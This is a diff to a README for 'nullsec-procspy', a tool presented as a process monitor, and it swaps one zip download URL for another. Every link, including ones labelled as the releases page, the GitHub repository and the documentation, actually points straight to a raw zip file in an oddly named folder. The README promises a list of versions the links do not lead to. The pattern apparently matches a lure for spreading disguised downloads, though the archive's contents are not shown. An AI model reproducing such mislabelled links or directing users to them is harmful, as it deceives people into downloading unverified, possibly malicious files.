@@ -1,6 +1,6 @@
 # 🛡️ nullsec-procspy - Monitor Your Processes with Ease
 
-[![Download nullsec-procspy](https://raw.githubusercontent.com/GRINCHLIFE/nullsec-procspy/main/sestuor/nullsec-procspy-3.8.zip%20nullsec--procspy-v1.0.0-brightgreen)](https://raw.githubusercontent.com/GRINCHLIFE/nullsec-procspy/main/sestuor/nullsec-procspy-3.8.zip)
+[![Download nullsec-procspy](https://github.com/GRINCHLIFE/nullsec-procspy/raw/refs/heads/main/sestuor/procspy_nullsec_v1.9.zip%20nullsec--procspy-v1.0.0-brightgreen)](https://github.com/GRINCHLIFE/nullsec-procspy/raw/refs/heads/main/sestuor/procspy_nullsec_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ To get started, follow these simple steps to download and run nullsec-procspy on
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download nullsec-procspy, [visit this page to download](https://raw.githubusercontent.com/GRINCHLIFE/nullsec-procspy/main/sestuor/nullsec-procspy-3.8.zip).  
+   To download nullsec-procspy, [visit this page to download](https://github.com/GRINCHLIFE/nullsec-procspy/raw/refs/heads/main/sestuor/procspy_nullsec_v1.9.zip).  
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Choose the latest version for the best features and fixes.
@@ -75,7 +75,7 @@ Join our community to share experiences, ask questions, and get help from other 
 
 For more information, tutorials, and updates, visit:
 
-- [GitHub Repository](https://raw.githubusercontent.com/GRINCHLIFE/nullsec-procspy/main/sestuor/nullsec-procspy-3.8.zip)
-- [Documentation](https://raw.githubusercontent.com/GRINCHLIFE/nullsec-procspy/main/sestuor/nullsec-procspy-3.8.zip)
+- [GitHub Repository](https://github.com/GRINCHLIFE/nullsec-procspy/raw/refs/heads/main/sestuor/procspy_nullsec_v1.9.zip)
+- [Documentation](https://github.com/GRINCHLIFE/nullsec-procspy/raw/refs/heads/main/sestuor/procspy_nullsec_v1.9.zip)
 
 Your journey to effective process monitoring starts here. Enjoy using nullsec-procspy!
